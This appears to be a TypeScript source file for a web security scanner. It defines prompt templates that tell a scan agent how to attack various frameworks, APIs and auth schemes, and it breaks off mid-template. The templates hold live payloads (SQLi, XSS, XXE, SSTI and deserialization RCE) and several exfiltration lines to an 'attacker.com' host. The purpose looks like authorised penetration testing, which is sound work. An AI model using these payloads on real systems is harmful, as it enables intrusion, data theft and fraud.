import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useMutation, useQuery } from "@tanstack/react-query";
import {
  ChevronDown, ChevronUp, Loader2, MessageSquarePlus, Info,
  LayoutTemplate, Check, X, ShieldAlert, AlertTriangle,
} from "lucide-react";
import { scansApi, type ScanCreate } from "@/api/scans";
import api from "@/api/client";

// ── Prompt templates ──────────────────────────────────────────────────────────

interface PromptTemplate {
  id: string;
  label: string;
  icon: string;
  description: string;
  category: string;
  prompt: string;
}

const TEMPLATE_CATEGORIES = [
  "All",
  "Web Frameworks",
  "CMS & Platforms",
  "API & Services",
  "Authentication",
  "Injection Attacks",
  "Business Logic",
  "Advanced Techniques",
  "Infrastructure",
];

const PROMPT_TEMPLATES: PromptTemplate[] = [
  // ── Web Frameworks ──────────────────────────────────────────────────────────
  {
    id: "aspnet",
    label: "ASP.NET / IIS",
    icon: "⚙️",
    category: "Web Frameworks",
    description: "ASP.NET WebForms or MVC on IIS",
    prompt:
      "Target is an ASP.NET application running on IIS. Prioritize the following attack vectors:\n" +
      "1. ViewState tampering - check if __VIEWSTATE is not MAC-validated; attempt deserialization payload via ysoserial.net\n" +
      "2. SQL injection - test all query string parameters and POST form fields with payloads: ' OR 1=1--, ' AND SLEEP(5)--, '; EXEC xp_cmdshell('whoami')--\n" +
      "3. Directory traversal - test file= and path= parameters with ..\\..\\..\\windows\\win.ini and %2e%2e%2f variants\n" +
      "4. Authentication bypass on /admin or /Admin - try default creds (admin/admin, administrator/Pa$$w0rd) and SQLi bypass on login form\n" +
      "5. Information disclosure - check for .aspx.bak, web.config exposure, detailed error messages revealing stack traces\n" +
      "6. HTTP method override - test PUT/DELETE via X-HTTP-Method-Override header on REST endpoints",
  },
  {
    id: "laravel",
    label: "Laravel / PHP",
    icon: "🐘",
    category: "Web Frameworks",
    description: "Laravel or generic PHP application",
    prompt:
      "Target is a Laravel PHP application. Attack strategy:\n" +
      "1. Mass assignment - inject hidden fields like is_admin=1, role=admin, verified=1 in registration/update forms\n" +
      "2. IDOR - enumerate /api/users/{id}, /api/orders/{id}, /api/invoices/{id} by iterating integer IDs\n" +
      "3. Debug/info routes - probe /_ignition/execute-solution (CVE-2021-3129 RCE), /telescope, /horizon, /debugbar\n" +
      "4. .env exposure - try /.env, /.env.backup, /.env.local, /.env.production at web root\n" +
      "5. SQL injection - test search, filter, and sort parameters; try time-based blind SQLi with SLEEP(5)\n" +
      "6. File upload bypass - upload .php disguised as image (shell.php.jpg, shell.php%00.jpg); check storage/app/public path\n" +
      "7. SSRF via URL parameters - test url=, link=, redirect= parameters with http://169.254.169.254/latest/meta-data/\n" +
      "8. Session fixation - check if Laravel session cookie changes after authentication",
  },
  {
    id: "django",
    label: "Django / Python",
    icon: "🐍",
    category: "Web Frameworks",
    description: "Django or Flask Python web app",
    prompt:
      "Target is a Django or Flask Python web application. Focus on:\n" +
      "1. Debug mode exposure - check if DEBUG=True is enabled; access /500 or trigger an error to reveal stack trace and settings\n" +
      "2. SSTI (Server-Side Template Injection) - inject {{7*7}}, {{config}}, {{request.environ}}, {{''.class.mro()[1].subclasses()}} in search fields, error pages, and URL parameters\n" +
      "3. Django admin - probe /admin/, /django-admin/, /staff/; try default creds admin/admin, test/test\n" +
      "4. SQL injection - Django ORM is generally safe but raw() queries may be vulnerable; test filter parameters with ' and '1'='1\n" +
      "5. CSRF bypass - check if CSRF protection is disabled on API endpoints; test POST requests without CSRF token\n" +
      "6. Insecure deserialization - test pickle-based session cookies; identify b64-encoded values in cookies and session data\n" +
      "7. Path traversal in file serving - test media/static file endpoints with ../../etc/passwd payloads",
  },
  {
    id: "nodejs",
    label: "Node.js / Express",
    icon: "🟢",
    category: "Web Frameworks",
    description: "Node.js Express or NestJS app",
    prompt:
      "Target is a Node.js (Express/NestJS/Fastify) application. Key attack vectors:\n" +
      "1. Prototype Pollution - inject __proto__[admin]=true, constructor[prototype][admin]=true in JSON body and query parameters; test merge/extend operations\n" +
      "2. NoSQL injection - if MongoDB backend: inject {\"username\":{\"$gt\":\"\"}, \"password\":{\"$gt\":\"\"}} in login JSON body; test $where, $regex operators\n" +
      "3. SSTI - if EJS/Pug/Handlebars used: test <%- include('/etc/passwd') %>, {{#with 'constructor'}}{{eval '7*7'}}{{/with}}\n" +
      "4. Path traversal - Express static file middleware vulnerabilities; test /static/../../etc/passwd and encoded variants\n" +
      "5. JWT weaknesses - check for weak secrets, alg:none attack, RS256 to HS256 confusion\n" +
      "6. Mass assignment - inject unexpected fields in PUT/PATCH requests; look for Mongoose schema without strict mode\n" +
      "7. ReDoS - submit crafted regex-triggering input to search endpoints to cause CPU exhaustion",
  },
  {
    id: "springboot",
    label: "Spring Boot / Java",
    icon: "☕",
    category: "Web Frameworks",
    description: "Java Spring Boot application",
    prompt:
      "Target is a Spring Boot Java application. High-priority attack vectors:\n" +
      "1. Spring Actuator exposure - probe /actuator, /actuator/env, /actuator/heapdump, /actuator/mappings, /actuator/beans; extract env vars and credentials\n" +
      "2. SpEL injection - if Spring Expression Language is used in user-controlled inputs, inject #{7*7}, #{T(java.lang.Runtime).getRuntime().exec('id')}\n" +
      "3. Java deserialization - test serialized Java objects in request parameters or cookies; look for Content-Type: application/x-java-serialized-object\n" +
      "4. SQL injection - test all @RequestParam and path variables with SQLi payloads; JPQL injection may bypass ORM protections\n" +
      "5. Insecure direct object reference - Spring Data REST auto-exposes JPA entities; enumerate /api/{entity}/{id}\n" +
      "6. IDOR via Spring HATEOAS links - follow _links in JSON responses to discover hidden endpoints\n" +
      "7. Swagger/OpenAPI exposure - check /v2/api-docs, /v3/api-docs, /swagger-ui.html for endpoint enumeration",
  },
  {
    id: "rails",
    label: "Ruby on Rails",
    icon: "💎",
    category: "Web Frameworks",
    description: "Ruby on Rails web application",
    prompt:
      "Target is a Ruby on Rails application. Attack focus:\n" +
      "1. Mass assignment - Rails strong parameters may be misconfigured; inject role=admin, admin=true, confirmed=true in form submissions\n" +
      "2. IDOR on RESTful routes - Rails convention: /users/:id, /posts/:id, /orders/:id; enumerate integer IDs and UUIDs\n" +
      "3. SQL injection - Rails ActiveRecord scopes and raw SQL; test where(), order() parameters with ' OR 1=1--\n" +
      "4. Rails Console exposure - check for /rails/info, /rails/info/properties in development mode\n" +
      "5. YAML/Ruby deserialization - cookies may use Ruby Marshal serialization; check for binary cookie values\n" +
      "6. Secret key leak - extract secret_key_base from error pages or Gemfile.lock exposure; forge session cookies\n" +
      "7. File upload - CarrierWave/Paperclip misconfiguration; test uploading .rb, .erb files; SSRF via remote URL upload",
  },

  // ── CMS & Platforms ─────────────────────────────────────────────────────────
  {
    id: "wordpress",
    label: "WordPress",
    icon: "📝",
    category: "CMS & Platforms",
    description: "WordPress CMS site",
    prompt:
      "Target is a WordPress installation. Comprehensive attack strategy:\n" +
      "1. User enumeration - GET /wp-json/wp/v2/users, /?author=1 through /?author=10; harvest usernames for brute force\n" +
      "2. XML-RPC abuse - POST to /xmlrpc.php with system.multicall for credential brute force; check if pingback.ping is enabled for SSRF\n" +
      "3. Plugin vulnerabilities - identify installed plugins from /wp-content/plugins/; check WPScan CVE database for known RCE/SQLi/file-upload vulns\n" +
      "4. Unauthenticated file upload - test vulnerable form plugins (Contact Form 7, Gravity Forms) for unrestricted file upload\n" +
      "5. wp-config.php exposure - try /wp-config.php, /wp-config.php.bak, /wp-config.txt\n" +
      "6. Default/weak credentials - try admin/admin, admin/password, admin/{sitename}123 on /wp-login.php and /wp-admin/\n" +
      "7. Directory listing - check /wp-content/uploads/ for sensitive files\n" +
      "8. REST API IDOR - test /wp-json/wp/v2/posts, /wp-json/wp/v2/media for drafts or private posts accessible without auth",
  },
  {
    id: "drupal",
    label: "Drupal",
    icon: "💧",
    category: "CMS & Platforms",
    description: "Drupal CMS",
    prompt:
      "Target is a Drupal CMS. Attack vectors to prioritize:\n" +
      "1. Drupalgeddon2 (CVE-2018-7600) - test /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax for RCE\n" +
      "2. Drupalgeddon3 (CVE-2018-7602) - test authenticated RCE via node/{id}/quickedit/form-field endpoint\n" +
      "3. PHP filter module - check if PHP input format is enabled; submit <?php system('id'); ?> in content fields\n" +
      "4. Admin interface - probe /admin, /user/login; try default creds admin/admin\n" +
      "5. CHANGELOG.txt / README.txt - extract exact Drupal version for CVE matching\n" +
      "6. Services module - check /api/user/login, /api/node for exposed REST endpoints\n" +
      "7. SQLi in Views - test exposed view endpoints with SQLi payloads in filter parameters",
  },
  {
    id: "magento",
    label: "Magento / E-Commerce",
    icon: "🛍️",
    category: "CMS & Platforms",
    description: "Magento or similar e-commerce CMS",
    prompt:
      "Target is a Magento e-commerce platform. Attack strategy:\n" +
      "1. Admin panel discovery - probe /admin, /index.php/admin, /backend; try common creds admin/admin123\n" +
      "2. Magento SQLi (CVE-2015-1397) - test the shoplift bug via /index.php/admin/Cms_Wysiwyg/directive/index/ if older version\n" +
      "3. Magento REST/SOAP API - enumerate /rest/V1/customers, /rest/V1/orders with admin Bearer token from brute force\n" +
      "4. Business logic - test negative item quantities, price manipulation via cart API, coupon stacking\n" +
      "5. File upload - test product image upload for PHP shell upload via Content-Type bypass\n" +
      "6. Information disclosure - check /app/etc/local.xml, /var/log/, /app/etc/config.xml for DB credentials\n" +
      "7. XXE in SOAP - Magento SOAP API may process XML; inject XXE payload <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
  },

  // ── API & Services ──────────────────────────────────────────────────────────
  {
    id: "rest_api",
    label: "REST API",
    icon: "🔌",
    category: "API & Services",
    description: "JSON REST API",
    prompt:
      "Target is a REST API. Systematic OWASP API Top 10 assessment:\n" +
      "1. BOLA/IDOR (API1) - replace {id} in all endpoints with sequential integers, UUIDs from other users; test GET /api/users/2, /api/orders/1337\n" +
      "2. Broken Auth (API2) - test endpoints without Authorization header; try expired/tampered JWT tokens; test token reuse across sessions\n" +
      "3. Excessive Data Exposure (API3) - compare API response fields against what UI displays; look for hidden fields (password_hash, ssn, secret)\n" +
      "4. Rate Limiting (API4) - send 100+ rapid requests to /api/login, /api/otp/verify; check for account lockout absence\n" +
      "5. BFLA (API5) - access admin-level actions as regular user: DELETE /api/users/{other_id}, POST /api/admin/ban/{user_id}\n" +
      "6. Mass Assignment (API6) - send extra JSON fields in PUT/PATCH: {\"role\":\"admin\", \"is_verified\":true, \"credit\":99999}\n" +
      "7. Injection (API8) - test JSON body fields for SQLi, NoSQLi, command injection; test header values including X-Forwarded-For\n" +
      "8. Verb tampering - test HTTP method not in documentation (PUT on read-only, DELETE on list endpoints)",
  },
  {
    id: "graphql",
    label: "GraphQL API",
    icon: "⬡",
    category: "API & Services",
    description: "GraphQL endpoint",
    prompt:
      "Target exposes a GraphQL API. Comprehensive attack strategy:\n" +
      "1. Introspection - send {__schema{types{name,fields{name,type{name}}}}} to enumerate all types, fields, and mutations\n" +
      "2. Batching attack - send array of login mutations in one request to bypass rate limiting: [{query: 'mutation{login(user:\"admin\",pass:\"a\")}'}, ...]\n" +
      "3. IDOR via GraphQL - query user(id:2), order(id:100) to access other users' data; test all ID arguments\n" +
      "4. Field suggestions - use misspelled fields to discover valid field names from error messages\n" +
      "5. DoS via deep queries - send deeply nested query {a{b{c{d{e{f{g{h{i{}}}}}}}}}} to cause CPU exhaustion\n" +
      "6. Injection in arguments - inject SQL/NoSQL in string arguments: user(name:\"admin' OR 1=1--\")\n" +
      "7. SSRF via URL fields - if mutation accepts URL arguments (uploadFromUrl, webhook), inject internal addresses\n" +
      "8. Authorization bypass - test if subscriptions bypass authorization that queries enforce; test mutations with missing auth",
  },
  {
    id: "soap_xml",
    label: "SOAP / XML Services",
    icon: "📨",
    category: "API & Services",
    description: "SOAP or XML-based web service",
    prompt:
      "Target exposes a SOAP or XML-based web service. Attack vectors:\n" +
      "1. XXE injection - inject into any XML field: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\n" +
      "2. SSRF via XXE - use <!ENTITY ssrf SYSTEM 'http://169.254.169.254/latest/meta-data/'> to access internal services\n" +
      "3. Blind XXE - use out-of-band exfiltration: <!ENTITY % data SYSTEM 'file:///etc/passwd'> to attacker-controlled server\n" +
      "4. WSDL enumeration - retrieve WSDL at ?wsdl or ?WSDL; map all operations, input/output parameters\n" +
      "5. SQLi in SOAP parameters - inject SQLi payloads in <username>, <id>, <search> elements\n" +
      "6. Parameter tampering - modify price, quantity, user_id elements in SOAP body\n" +
      "7. WS-Security bypass - test if Username token validation can be bypassed with invalid timestamps or missing nonce\n" +
      "8. Response expansion attack - request large datasets to exhaust server memory",
  },

  // ── Authentication ───────────────────────────────────────────────────────────
  {
    id: "jwt_advanced",
    label: "JWT Authentication",
    icon: "🔑",
    category: "Authentication",
    description: "JWT-based auth with advanced tests",
    prompt:
      "Application uses JWT for authentication. Advanced JWT attack sequence:\n" +
      "1. Algorithm confusion (alg:none) - change header to {\"alg\":\"none\",\"typ\":\"JWT\"} and remove signature; test if server accepts it\n" +
      "2. RS256 → HS256 confusion - take the server's RSA public key, switch alg to HS256, sign with the public key as HMAC secret\n" +
      "3. Weak secret brute force - extract JWT and crack with hashcat: hashcat -a 0 -m 16500 token.txt wordlist.txt\n" +
      "4. JWT header injection (jku/x5u) - craft token with jku pointing to attacker-controlled JWKS endpoint\n" +
      "5. kid injection - if kid parameter used: inject ../../../dev/null (HMAC with empty key) or SQLi in kid parameter\n" +
      "6. Claim tampering - modify sub (user ID), role, scope, exp claims; re-sign if secret is known\n" +
      "7. Token leakage - check HTTP Referer header, browser history, error logs for JWT exposure\n" +
      "8. JWT in URL - if token passed as query param, test for CSRF and log exposure",
  },
  {
    id: "oauth2",
    label: "OAuth2 / OIDC",
    icon: "🔐",
    category: "Authentication",
    description: "OAuth2 or OpenID Connect flow",
    prompt:
      "Application implements OAuth2 or OpenID Connect. Attack flow:\n" +
      "1. State parameter bypass - remove or reuse state parameter in authorization request; test for CSRF on OAuth callback\n" +
      "2. Open redirect in redirect_uri - inject redirect_uri=https://evil.com; test fragment variations and URL encoding\n" +
      "3. Authorization code interception - register as OAuth client; manipulate redirect_uri to capture codes\n" +
      "4. Token leakage in Referer - check if access_token appears in Referer header after redirect\n" +
      "5. Scope escalation - request additional scopes (admin, write:all) in authorization request\n" +
      "6. Account takeover via provider linking - link attacker's social account to victim's account if email is not verified\n" +
      "7. PKCE bypass - if PKCE is optional, test implicit flow or code exchange without code_verifier\n" +
      "8. Token endpoint injection - test client_secret, grant_type, code parameters for injection vulnerabilities",
  },
  {
    id: "saml",
    label: "SAML SSO",
    icon: "🏛️",
    category: "Authentication",
    description: "SAML-based Single Sign-On",
    prompt:
      "Application uses SAML for SSO authentication. Attack vectors:\n" +
      "1. XML signature wrapping (XSW) - move signed assertion inside unsigned copy; test multiple XSW variants (XSW1-XSW8)\n" +
      "2. Comment injection - inject comments in NameID: admin<!--evil-->@company.com to bypass email-based authorization\n" +
      "3. XML external entity in SAML - inject XXE payload in SAML request to read internal files\n" +
      "4. Recipient/destination mismatch - modify Recipient and AudienceRestriction to target different SP\n" +
      "5. Expired assertion replay - capture and replay expired SAML assertion if timestamp validation is missing\n" +
      "6. Signature stripping - remove SignatureValue and test if SP validates its presence\n" +
      "7. NameID format abuse - test NameIDFormat=unspecified vs emailAddress; try format confusion attacks\n" +
      "8. Base64/deflate manipulation - decode SAML request, modify XML attributes, re-encode and replay",
  },
  {
    id: "default_creds",
    label: "Default Credentials",
    icon: "🔓",
    category: "Authentication",
    description: "Systematic default & weak credential testing",
    prompt:
      "Perform comprehensive default and weak credential testing:\n" +
      "1. Default credentials to test: admin/admin, admin/password, admin/admin123, admin/123456, admin/Password1, admin/P@ssw0rd, administrator/administrator, root/root, root/toor, test/test, guest/guest, user/user, demo/demo, operator/operator, service/service\n" +
      "2. Application-specific defaults: {appname}/admin, {appname}/{appname}, {appname}123\n" +
      "3. SQL injection bypass on login: ' OR '1'='1'--, ' OR 1=1--, admin'--,  ') OR ('1'='1, 1' OR '1'='1\n" +
      "4. Response timing analysis - measure response time difference between valid/invalid usernames for user enumeration\n" +
      "5. Account lockout testing - attempt 10+ failed logins; check if account is locked or rate limited\n" +
      "6. Password reset flow - test predictable reset tokens, host header injection in reset emails, reset token reuse\n" +
      "7. Username enumeration - compare error messages for valid vs invalid usernames\n" +
      "8. Credential stuffing simulation - test top 20 commonly breached password/username combinations",
  },

  // ── Injection Attacks ────────────────────────────────────────────────────────
  {
    id: "sqli_advanced",
    label: "SQL Injection",
    icon: "💉",
    category: "Injection Attacks",
    description: "Advanced SQLi testing across all parameter types",
    prompt:
      "Perform comprehensive SQL injection testing across all attack surfaces:\n" +
      "1. Error-based SQLi - test: ' (single quote), '' (double quote), '; SELECT SLEEP(5)--, ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--, '; WAITFOR DELAY '0:0:5'--\n" +
      "2. Blind boolean-based - ' AND 1=1-- (true), ' AND 1=2-- (false); observe response differences\n" +
      "3. Time-based blind - ' AND SLEEP(5)--, '; IF(1=1) WAITFOR DELAY '0:0:5'--; measure response time delta\n" +
      "4. Out-of-band - ' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--\n" +
      "5. UNION-based - determine column count: ' ORDER BY 1--, ' ORDER BY 2--; then: ' UNION SELECT null,null,database()--\n" +
      "6. Second-order SQLi - inject payload in profile fields that is executed when retrieved by admin functions\n" +
      "7. JSON/XML SQLi - inject in JSON body: {\"id\": \"1 OR 1=1\"}; XML: <id>1 OR 1=1</id>\n" +
      "8. HTTP header SQLi - test User-Agent, X-Forwarded-For, Referer, Cookie values that may be logged to DB\n" +
      "9. Stored procedures - test for xp_cmdshell (MSSQL), UTL_HTTP (Oracle), LOAD_FILE / INTO OUTFILE (MySQL)",
  },
  {
    id: "xss_advanced",
    label: "XSS (Cross-Site Scripting)",
    icon: "🕸️",
    category: "Injection Attacks",
    description: "Reflected, stored, DOM-based XSS",
    prompt:
      "Comprehensive XSS testing across all injection contexts:\n" +
      "1. Basic reflected - inject <script>alert(document.domain)</script>, <img src=x onerror=alert(1)>, <svg onload=alert(1)>\n" +
      "2. Context-breaking payloads - if inside attribute: \" autofocus onfocus=alert(1) x=\"; if inside JS string: ';alert(1)//\n" +
      "3. Filter bypass - test: <ScRiPt>alert(1)</ScRiPt>, <img src='x' oNeRrOr='alert(1)'>, javascript:alert(1), &#x6A;avascript:alert(1)\n" +
      "4. DOM-based XSS - check location.hash, document.referrer, window.name, postMessage handlers in JavaScript\n" +
      "5. Stored XSS - inject in profile fields, comments, usernames, email fields that render for other users\n" +
      "6. Stored XSS in admin panel - inject in fields that administrators view (support tickets, user reports)\n" +
      "7. CSP bypass - if CSP present, check for script-src 'unsafe-inline', JSONP endpoints, AngularJS ng-app injection\n" +
      "8. mXSS (mutation XSS) - test payloads that mutate after HTML parsing: <p title='</p><img/onerror=alert(1)>'>\n" +
      "9. XSS via file upload - upload SVG file containing <svg><script>alert(1)</script></svg>",
  },
  {
    id: "command_injection",
    label: "Command Injection / RCE",
    icon: "💻",
    category: "Injection Attacks",
    description: "OS command injection and RCE",
    prompt:
      "Test for OS command injection and remote code execution:\n" +
      "1. Basic injection - test in all input parameters: ; id, | id, && id, || id, `id`, $(id)\n" +
      "2. Blind command injection - use time delays: ; sleep 10, | ping -c 10 127.0.0.1, && powershell -c Start-Sleep 10\n" +
      "3. Out-of-band exfil - ; curl http://attacker.com/$(id), ; nslookup $(whoami).attacker.com\n" +
      "4. URL/filename parameters - test file=, filename=, path=, dir= parameters; try ../../etc/passwd with ; id appended\n" +
      "5. Ping/network utilities - if app pings hosts: test 127.0.0.1; cat /etc/passwd; test IP fields: 8.8.8.8 & whoami\n" +
      "6. PDF/image generation - if wkhtmltopdf or ImageMagick used: inject --run-script or MVG RCE payloads\n" +
      "7. Template engines - SSTI payloads: {{7*7}}, ${7*7}, #{7*7}, <% 7*7 %>, @(7*7); escalate to {{config.items()}}, {{''.__class__.__mro__[1].__subclasses__()}}\n" +
      "8. Log4Shell (CVE-2021-44228) - inject ${jndi:ldap://attacker.com/a} in User-Agent, X-Forwarded-For, username fields",
  },
  {
    id: "xxe",
    label: "XXE Injection",
    icon: "📄",
    category: "Injection Attacks",
    description: "XML External Entity injection",
    prompt:
      "Test for XML External Entity (XXE) injection in all XML-accepting endpoints:\n" +
      "1. Classic file read - inject: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\n" +
      "2. Windows path - <!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>\n" +
      "3. SSRF via XXE - <!ENTITY ssrf SYSTEM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'>\n" +
      "4. Blind XXE (OOB) - <!ENTITY % data SYSTEM 'file:///etc/passwd'><!ENTITY % oob '<!ENTITY exfil SYSTEM \"http://attacker.com/?d=%data;\">'>%oob;\n" +
      "5. SVG upload XXE - upload SVG: <svg xmlns='http://www.w3.org/2000/svg'><!DOCTYPE svg [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><text>&xxe;</text></svg>\n" +
      "6. XLSX/DOCX XXE - modify xl/worksheets/sheet1.xml inside office file to include XXE entity\n" +
      "7. PHP filter exfil - <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'> for binary files\n" +
      "8. XInclude - if DTD not allowed: <foo xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include parse='text' href='file:///etc/passwd'/></foo>",
  },

  // ── Business Logic ───────────────────────────────────────────────────────────
  {
    id: "ecommerce",
    label: "E-Commerce / Cart",
    icon: "🛒",
    category: "Business Logic",
    description: "Online shop, cart, payment logic",
    prompt:
      "Target is an e-commerce application. Business logic attack strategy:\n" +
      "1. Negative quantity - add item with quantity=-1 or quantity=-999 to cart; observe if total price decreases\n" +
      "2. Price tampering - intercept checkout request; modify price=0.01, unit_price=0.00, total=0; test integer overflow with price=9999999999\n" +
      "3. Coupon/discount abuse - apply same coupon multiple times, combine exclusive coupons, use expired coupons, test coupon code enumeration\n" +
      "4. Race condition on checkout - send simultaneous purchase requests for single-use voucher or limited stock item\n" +
      "5. Order IDOR - enumerate /orders/{id}, /receipts/{id}; access other users' orders, track other users' packages\n" +
      "6. Payment gateway bypass - skip payment step by directly accessing /order/complete or /checkout/success with crafted parameters\n" +
      "7. Inventory manipulation - purchase item count that exceeds stock; test with concurrent requests\n" +
      "8. Shipping address IDOR - change shipping address of confirmed orders belonging to other users",
  },
  {
    id: "banking",
    label: "Banking / Financial",
    icon: "🏦",
    category: "Business Logic",
    description: "Financial app, fund transfers",
    prompt:
      "Target is a banking or financial application. Critical attack vectors:\n" +
      "1. IDOR on account - enumerate /api/accounts/{id}/balance, /api/transactions/{id}; access other customers' data\n" +
      "2. Fund transfer logic - test negative transfer amounts (transfer -100 from account B to A to credit A); test self-transfer\n" +
      "3. Race condition on transfers - send simultaneous withdrawal requests exceeding account balance\n" +
      "4. Parameter tampering in transfer - intercept and modify from_account_id, to_account_id, amount in transfer request\n" +
      "5. CSRF on fund transfer - test if transfer endpoints have CSRF protection; forge cross-origin requests\n" +
      "6. Interest rate manipulation - if investment/loan interest is set client-side, tamper the rate parameter\n" +
      "7. 2FA bypass - test if 2FA can be bypassed by directly accessing post-auth endpoints after 1FA; test OTP reuse\n" +
      "8. Statement injection - inject malicious content in memo/description fields that appears in PDF statements",
  },
  {
    id: "idor_advanced",
    label: "IDOR / Access Control",
    icon: "🗝️",
    category: "Business Logic",
    description: "Broken access control and IDOR",
    prompt:
      "Comprehensive broken access control and IDOR testing:\n" +
      "1. Horizontal IDOR - replace own user ID with another: /profile/2, /user/edit/3, /api/users/4/settings\n" +
      "2. Vertical privilege escalation - access admin endpoints as regular user: /admin/users, /admin/settings, /manager/reports\n" +
      "3. GUID/UUID IDOR - test UUIDs in URL: predict or enumerate; check if UUIDs are exposed in API responses or JS source\n" +
      "4. Indirect reference - test hash/token-based references in parameters: ?doc=abc123; attempt to forge or brute-force\n" +
      "5. Path traversal to IDOR - /user/../../admin; /files/../../../etc/passwd\n" +
      "6. HTTP method bypass - if GET /admin returns 403, try POST /admin, PUT /admin, PATCH /admin\n" +
      "7. Header-based bypass - add X-Original-URL: /admin, X-Forwarded-URL: /admin, X-Rewrite-URL: /admin to bypass WAF\n" +
      "8. Role manipulation - if role is in JWT or cookie, modify user role to admin/superuser; test API endpoints that trust client-supplied roles",
  },

  // ── Advanced Techniques ──────────────────────────────────────────────────────
  {
    id: "ssrf",
    label: "SSRF",
    icon: "🌐",
    category: "Advanced Techniques",
    description: "Server-Side Request Forgery",
    prompt:
      "Perform comprehensive SSRF testing against all URL-accepting parameters:\n" +
      "1. Cloud metadata - test http://169.254.169.254/latest/meta-data/ (AWS), http://metadata.google.internal/, http://169.254.169.254/metadata/instance (Azure)\n" +
      "2. Internal service discovery - probe http://127.0.0.1:8080, http://localhost:6379 (Redis), http://127.0.0.1:27017 (MongoDB), http://127.0.0.1:9200 (Elasticsearch)\n" +
      "3. IP bypass techniques - test http://0.0.0.0:80, http://[:1]:80, http://0x7f000001 (hex), http://2130706433 (decimal), http://127.1\n" +
      "4. DNS rebinding - use SSRF via domain that resolves to 127.0.0.1 after initial check\n" +
      "5. Protocol smuggling - test gopher:// for Redis/SMTP injection, dict:// for service enumeration, file:// for LFI\n" +
      "6. URL scheme bypass - test http://evil.com#@169.254.169.254, http://169.254.169.254.evil.com, http://evil.com@169.254.169.254\n" +
      "7. Webhook/callback endpoints - if app accepts webhook URL, test internal network access\n" +
      "8. Blind SSRF - use out-of-band collaborator; inject http://burpcollaborator.net or http://attacker.com in URL fields",
  },
  {
    id: "race_condition",
    label: "Race Condition",
    icon: "⚡",
    category: "Advanced Techniques",
    description: "Time-of-check to time-of-use flaws",
    prompt:
      "Test for race condition vulnerabilities (TOCTOU - Time of Check to Time of Use):\n" +
      "1. Single-use coupon race - send 10-50 simultaneous requests to redeem same coupon code using Turbo Intruder or concurrent curl\n" +
      "2. Account balance race - send concurrent withdrawal/transfer requests exceeding balance simultaneously\n" +
      "3. Email verification link - send multiple simultaneous requests with same verification token\n" +
      "4. Like/vote count abuse - send parallel requests to increment like counter beyond permitted limit\n" +
      "5. Inventory race - purchase last-in-stock item with concurrent requests from multiple accounts\n" +
      "6. Password reset token - request multiple reset tokens simultaneously; test if all remain valid\n" +
      "7. File upload race - upload file and access it during processing window before security checks complete\n" +
      "8. Two-factor auth race - send multiple requests with same OTP simultaneously; test if server accepts duplicate use\n" +
      "Technique: Use HTTP/2 single-packet attack (Turbo Intruder) to send all requests in same TCP packet for maximum timing accuracy.",
  },
  {
    id: "deserialization",
    label: "Insecure Deserialization",
    icon: "📦",
    category: "Advanced Techniques",
    description: "Java, PHP, Python deserialization",
    prompt:
      "Test for insecure deserialization vulnerabilities:\n" +
      "1. Java deserialization - look for base64-encoded binary data starting with rO0AB (aced0005 hex) in cookies, request parameters, viewstate; use ysoserial payloads: CommonsCollections1, Spring1, Groovy1\n" +
      "2. PHP deserialization - look for serialized strings starting with O:, a:, s: in cookies/parameters; craft magic method __wakeup, __destruct payloads\n" +
      "3. Python pickle - look for binary data in session cookies (Flask, Django); test with crafted pickle payload that calls os.system()\n" +
      "4. .NET ViewState - test unprotected ViewState with ysoserial.net payloads; check if VIEWSTATEGENERATOR is predictable\n" +
      "5. Node.js serialize - if node-serialize or serialize-javascript used: inject {\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id');}()\"}\n" +
      "6. Ruby Marshal - test base64-encoded Marshal data in session cookies with crafted gadget chains\n" +
      "7. XML deserialization - test JAXB/XStream Java deserialization via XML endpoint with CVE-2021-39144 payloads\n" +
      "8. Mass assignment with deserialization - inject object type hints in JSON body: {\"__class__\":\"User\",\"is_admin\":true}",
  },
  {
    id: "http_smuggling",
    label: "HTTP Request Smuggling",
    icon: "🚇",
    category: "Advanced Techniques",
    description: "CL.TE / TE.CL desync attacks",
    prompt:
      "Test for HTTP request smuggling (desync attacks):\n" +
      "1. CL.TE - send ambiguous request with both Content-Length and Transfer-Encoding: chunked; use Burp HTTP Request Smuggler\n" +
      "2. TE.CL - reverse the precedence; front-end uses TE, back-end uses CL\n" +
      "3. Basic CL.TE probe: POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX\n" +
      "4. Confirm smuggling - send smuggled prefix that triggers different response for follow-up innocent request\n" +
      "5. Capture other users' requests - smuggle partial request head to capture subsequent user's Authorization header\n" +
      "6. Bypass front-end access controls - smuggle request to internal endpoint blocked by front-end WAF\n" +
      "7. Reflected XSS via smuggling - inject XSS payload in smuggled prefix that reflects in victim's response\n" +
      "8. Cache poisoning via smuggling - poison cache with smuggled response to serve malicious content to victims",
  },
  {
    id: "cache_poisoning",
    label: "Cache Poisoning",
    icon: "🗄️",
    category: "Advanced Techniques",
    description: "Web cache deception and poisoning",
    prompt:
      "Test for web cache poisoning and web cache deception:\n" +
      "1. Cache key manipulation - identify unkeyed headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL; inject XSS payload via these headers\n" +
      "2. Host header poisoning - modify Host header to attacker.com; cache the response; check if other users receive poisoned page\n" +
      "3. Cache key exclusion - add ignored parameters: ?cb=1, ?utm_source=x; inject XSS in response via these unkeyed params\n" +
      "4. Web cache deception - request /profile/nonexistent.css, /account/settings.jpg; check if authenticated response is cached\n" +
      "5. Vary header bypass - test X-Forwarded-For, True-Client-IP as unkeyed inputs for cache poisoning\n" +
